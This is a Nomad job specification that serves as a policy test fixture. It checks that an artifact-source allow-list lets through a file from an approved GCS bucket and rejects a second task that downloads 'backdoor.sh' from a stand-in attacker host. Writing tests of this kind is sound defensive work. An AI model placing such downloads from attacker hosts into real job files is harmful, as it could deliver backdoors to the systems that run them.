# Job with MULTIPLE tasks and artifacts - tests policy iteration logic
# This job has one task with approved source and one with unapproved - should FAIL
#
# NOTE: Replace PROJECT_ID with your actual GCP project ID before running

job "test-mixed-artifacts" {
  datacenters = ["dc1"]
  type        = "batch"

  group "app" {
    count = 1

    # Task 1: Approved artifact from GCS bucket
    task "good-task" {
      driver = "docker"

      config {
        image   = "alpine:latest"
        command = "/bin/sh"
        args    = ["-c", "echo 'Good task with approved artifact'"]
      }

      # APPROVED SOURCE - GCS bucket created by this module
      artifact {
        source      = "gcs::https://www.googleapis.com/storage/v1/hc-20d5722972a64f85ac80811f973-nomad-artifacts/app/config.yaml"
        destination = "local/"
      }

      resources {
        cpu    = 100
        memory = 128
      }
    }

    # Task 2: Unapproved artifact - this should cause the job to fail
    task "bad-task" {
      driver = "docker"

      config {
        image   = "alpine:latest"
        command = "/bin/sh"
        args    = ["-c", "echo 'Bad task with unapproved artifact'"]
      }

      # UNAPPROVED SOURCE - external URL not in allowed prefixes
      artifact {
        source      = "https://evil-hacker-site.com/backdoor.sh"
        destination = "local/"
      }

      resources {
        cpu    = 100
        memory = 128
      }
    }
  }
}
